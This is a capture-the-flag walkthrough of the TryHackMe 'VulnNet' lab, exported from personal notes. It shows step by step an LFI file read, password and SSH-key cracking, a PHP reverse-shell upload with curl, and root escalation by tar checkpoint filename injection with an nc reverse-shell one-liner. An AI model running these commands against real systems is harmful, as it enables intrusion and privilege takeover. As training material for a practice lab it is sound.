<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>vulnNet</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>vulnNet</h1><br/><p><strong><h1>THM: VulnNet</h1></strong></p><p></p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p></p><p></p><p><strong><h4>Network Enumeration</h4></strong></p><p><strong><h5>Nmap</h5></strong></p><p></p><p><img src="images/69-1.png" alt="images/69-1.png" /></p><p></p><p></p><p><strong><h4>Webserver Enumeration</h4></strong></p><p></p><p><img src="images/69-2.png" alt="images/69-2.png" /></p><p></p><p></p><p><img src="images/69-3.png" alt="images/69-3.png" /></p><p></p><p><img src="images/69-4.png" alt="images/69-4.png" /></p><p></p><p><img src="images/69-5.png" alt="images/69-5.png" /></p><p></p><p>In one of requests, we find a java script file pointing to a subdomain. We add it in the /etc/hosts file &amp; access it.</p><p></p><p><img src="images/69-6.png" alt="images/69-6.png" /></p><p></p><p>We do  not have credentials yet.</p><p>In another java script file we found a url which could be potentially used for LFI</p><p></p><p><img src="images/69-7.png" alt="images/69-7.png" /></p><p></p><p></p><p><img src="images/69-8.png" alt="images/69-8.png" /></p><p></p><p>We successfully found LFI.</p><p></p><p><img src="images/69-9.png" alt="images/69-9.png" /></p><p></p><p><strong>http://vulnnet.thm/index.php?referer=/etc/passwd</strong></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>Next, we use LFI to look for the .htpasswd file to check for credentials asked in the HTTP-Header.</p><p>referer=/etc/apache2/.htpasswd </p><p></p><p><img src="images/69-10.png" alt="images/69-10.png" /></p><p></p><p>We examine the hash with hashid.</p><p></p><p><img src="images/69-11.png" alt="images/69-11.png" /></p><p></p><p>We will use john as hashcat is taking a long time using the same dictionsary. </p><p></p><p><strong>Note:</strong> It is due to the way both tools use the dictionary file. They read it differently. (I tested this by takling the actual password to a personal dictionary file which hashcat could easily crack)</p><p></p><p></p><p><img src="images/69-12.png" alt="images/69-12.png" /></p><p></p><p>We use the credentials we got to login to the <strong>http://broadcast.vulnnet.thm</strong> where we were asked HTTP Header credentials.</p><p></p><p><img src="images/69-13.png" alt="images/69-13.png" /></p><p></p><p></p><p>We login and find a video/photo sharing platform. But its under development as only developers have access and there is no content. However, there is a create new account button on the top of the page. We create a new account &amp; login.</p><p><img src="images/69-14.png" alt="images/69-14.png" /></p><p></p><p></p><p><img src="images/69-15.png" alt="images/69-15.png" /></p><p></p><p>Next, we get error while creating one.</p><p>We searched for clipbucket in exploit-db and found many vulnerabilities. But, we need to know the version.</p><p>We found the version info in burpsuite intercepts.</p><p></p><p><img src="images/69-16.png" alt="images/69-16.png" /></p><p></p><p>Next, we check searchsploit.</p><p></p><p><img src="images/69-17.png" alt="images/69-17.png" /></p><p></p><p>Next, we use the above to get initial foothold in the system.</p><p></p><p><img src="images/69-18.png" alt="images/69-18.png" /></p><p> </p><p> Thie above is the information from the exploit text file for unathenticated upload.</p><p></p><p>We see the /actions endpoint in our website.</p><p></p><p><img src="images/69-19.png" alt="images/69-19.png" /></p><p></p><p>We find both the upload programs. We can use any of them.</p><p>We create a listener on our local machine.</p><p></p><p><strong>rlwrap nc -lvnp 9000</strong></p><p></p><p>Then , copy a reverse shell php file from webshells of kali machine &amp; change the settings to point to our kali tunnel IP &amp; port 9000</p><p></p><p><img src="images/69-20.png" alt="images/69-20.png" /></p><p>We changed the listner details in the shell as per our system.</p><p></p><p><img src="images/69-21.png" alt="images/69-21.png" /></p><p></p><p></p><p></p><p>We will now upload the shell.php file to the target machine using the following payload. (Ref: exploit-db information)</p><p></p><p><strong>curl -F &quot;file=@shell.php&quot; -F &quot;plupload=1&quot; -F &quot;name=rev_shell.php&quot; &quot;http://broadcast.vulnnet.thm/actions/beats_uploader.php&quot;</strong></p><p></p><p><strong>Note: </strong>The above will fail as it doesn&#39;t caters for the HHTP-HEAD login we came through.</p><p>It can be handled by 2 ways.</p><p></p><p>1. Giving -u username:password </p><p>2.  Giving -H ‘Authorization-Data’  (Found in Burpsuite http history when we logged in the HTTP-HEADER</p><p></p><p>Final Payload:</p><p></p><p></p><p><strong>curl -F &quot;file=@shell.php&quot; -F &quot;plupload=1&quot; -F &quot;name=rev_shell.php&quot; &quot;http://broadcast.vulnnet.thm/actions/beats_uploader.php&quot; -u developers:PASSWORD_HERE</strong></p><p></p><p><img src="images/69-22.png" alt="images/69-22.png" /></p><p></p><p><strong>OR</strong></p><p></p><p><strong>curl -F &quot;file=@shell.php&quot; -F &quot;plupload=1&quot; -F &quot;name=rev_shell.php&quot; &quot;http://broadcast.vulnnet.thm/actions/beats_uploader.php&quot;-H &quot;Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw==&quot;</strong></p><p></p><p><img src="images/69-23.png" alt="images/69-23.png" /></p><p></p><p></p><p>Next, we go to /actions directory &amp; find the CB_BEATS_UPLOAD_DIR. </p><p></p><p><img src="images/69-24.png" alt="images/69-24.png" /></p><p></p><p></p><p>We run our upload and get the reverse connection in our listener.</p><p></p><p><img src="images/69-25.png" alt="images/69-25.png" /></p><p> </p><p><strong><h2> Privilege Escalation</h2></strong></p><p> </p><p> We searched the local file system &amp; found the following folder.</p><p> </p><p> <img src="images/69-26.png" alt="images/69-26.png" /></p><p> </p><p> We copy it to /tmp directory &amp; extract it.</p><p> </p><p> <img src="images/69-27.png" alt="images/69-27.png" /></p><p> </p><p> we found the id_rsa file for the user server-management.</p><p> We will use this information to login to ssh.</p><p> </p><p> However, when we attempt to login to ssh with the id_rsa file. </p><p> Copy the contents to our local machine to a file named target_id_rsa.</p><p> Then change its permission to 600 &amp; use it for login.</p><p> We are asked for a paraphrase.</p><p> <img src="images/69-28.png" alt="images/69-28.png" /></p><p> </p><p> To crack the paraphrase, we will use <strong>ssh2john</strong> &amp; <strong>john</strong>.</p><p> </p><p><em> ssh2john target_id_rsa &gt; ssh_hash</em></p><p><em> john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash</em></p><p> </p><p> <img src="images/69-29.png" alt="images/69-29.png" /></p><p> </p><p> Now, we will use the paraphrase we found above to login to ssh</p><p> <img src="images/69-30.png" alt="images/69-30.png" /></p><p> </p><p> We get the user flag in the home directory of the user.</p><p> </p><p> <img src="images/69-31.png" alt="images/69-31.png" /></p><p> </p><p> </p><p>Next, we search for system wide cronjobs using the following.</p><p></p><p><em>cat /etc/crontab</em></p><p></p><p><img src="images/69-32.png" alt="images/69-32.png" /></p><p></p><p>We can see a <strong>backupsrv.sh</strong> script running every 2 minutes as root. We check its contents.</p><p></p><p><img src="images/69-33.png" alt="images/69-33.png" /></p><p></p><p>From the above scipt we conclude that, the script will backup everything that is present in the server-management user&#39;s Documents directory using <strong>tar</strong> command.</p><p>We will use the a tar privilege escalation to get root access.</p><p></p><p>We will create a <strong>shell.sh</strong> file in the <strong>/home/server-management/Documents</strong> directory with the following contents.</p><p></p><p><em>!#/bin/bash</em></p><p><em>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.17.5.85 8888 &gt;/tmp/f</em></p><p></p><p><img src="images/69-34.png" alt="images/69-34.png" /></p><p></p><p>Then, we will start a listener on our local kali machine.</p><p></p><p><em>rlwrap nc -lvnp 8888</em></p><p></p><p>Then, make th <strong>shell.sh</strong> executable &amp; create the following 2 files in the <strong>/home/server-management/Documents</strong> directory.</p><p></p><p><em>chmod +x shell.sh</em></p><p><em>touch /home/server-management/Documents/&quot;--checkpoint=1&quot;</em></p><p><em>touch /home/server-management/Documents/&quot;--checkpoint-action=exec=sh shell.sh&quot;</em></p><p></p><p><img src="images/69-35.png" alt="images/69-35.png" /></p><p></p><p>Then, we wait as the script runs every 2 minutes. After a while we will get reverse connection in our listener as the root user.</p><p></p><p><img src="images/69-36.png" alt="images/69-36.png" /></p><p></p><p>We get the root flag in the home directory of root.</p><p></p><p><img src="images/69-37.png" alt="images/69-37.png" /></p><p></p><p>Thanks!!</p></div>
</body>
</html>
